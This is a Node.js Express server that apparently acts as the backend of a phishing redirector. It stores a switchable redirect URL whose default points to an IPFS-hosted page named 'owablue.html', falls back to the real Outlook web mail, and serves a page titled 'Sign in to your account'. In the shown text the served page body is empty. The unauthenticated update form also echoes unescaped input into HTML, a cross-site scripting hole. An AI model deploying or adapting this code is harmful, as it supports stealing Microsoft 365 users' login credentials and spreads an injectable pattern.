const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Initialize SQLite database
const db = new sqlite3.Database("./config.db", (err) => {
  if (err) {
    console.error("Error opening database:", err.message);
  } else {
    console.log("Connected to SQLite database.");
    db.run(
      `CREATE TABLE IF NOT EXISTS settings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        redirect_url TEXT,
        fallback_url TEXT
      )`,
      (err) => {
        if (err) {
          console.error("Error creating table:", err.message);
        } else {
          // Ensure default values exist
          db.run(
            `INSERT INTO settings (redirect_url, fallback_url)
             SELECT 'https://cloudflare-ipfs.com/ipfs/QmTS1MVDgZebn5e2zN4Bdz9ag1CUFRTSp7nxS97UWV1uuQ/owablue.html#', 
             'https://outlook.office365.com/mail'
             WHERE NOT EXISTS (SELECT 1 FROM settings)`
          );
        }
      }
    );
  }
});

// Serve the page
app.get("/", (req, res) => {
  db.get("SELECT redirect_url, fallback_url FROM settings LIMIT 1", (err, row) => {
    if (err) {
      res.status(500).send("Error loading settings.");
    } else {
      // Render the HTML with dynamic values
      const redirectUrl = row ? row.redirect_url : "";
      const fallbackUrl = row ? row.fallback_url : "";

      res.send(`
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Sign in to your account</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
         body {
            font-family: Arial, sans-serif;
            margin: 20px;
         }
         .hidden {
            display: none;
         }
      </style>
   </head>
   <body>
      
   </body>
</html>
      `);
    }
  });
});

// Handle form submissions to update settings
app.post("/update", (req, res) => {
  const { redirectUrl, fallbackUrl } = req.body;

  db.run(
    `UPDATE settings SET redirect_url = ?, fallback_url = ?`,
    [redirectUrl, fallbackUrl],
    function (err) {
      if (err) {
        res.status(500).send("Error updating settings.");
      } else {
        res.send(`
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Settings Updated</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
   </head>
   <body>
      <h2>Settings Updated Successfully</h2>
      <p>Redirect URL: ${redirectUrl}</p>
      <p>Fallback URL: ${fallbackUrl}</p>
      <a href="/">Go Back</a>
      
      
      <div id="updateSection">
         <h2>Update Redirect Settings</h2>
         <form method="POST" action="/update">
            <label for="redirectUrl">Redirect URL:</label>
            <input
               type="text"
               id="redirectUrl"
               name="redirectUrl"
               value="${redirectUrl}"
               placeholder="Enter new redirect URL"
               style="width: 100%; padding: 10px; margin: 10px 0;"
            />
            <label for="fallbackUrl">Default Fallback URL:</label>
            <input
               type="text"
               id="fallbackUrl"
               name="fallbackUrl"
               value="${fallbackUrl}"
               placeholder="Enter new fallback URL"
               style="width: 100%; padding: 10px; margin: 10px 0;"
            />
            <button type="submit" style="padding: 10px 20px;">Save Changes</button>
         </form>
      </div>
      
   </body>
</html>
        `);
      }
    }
  );
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
}); 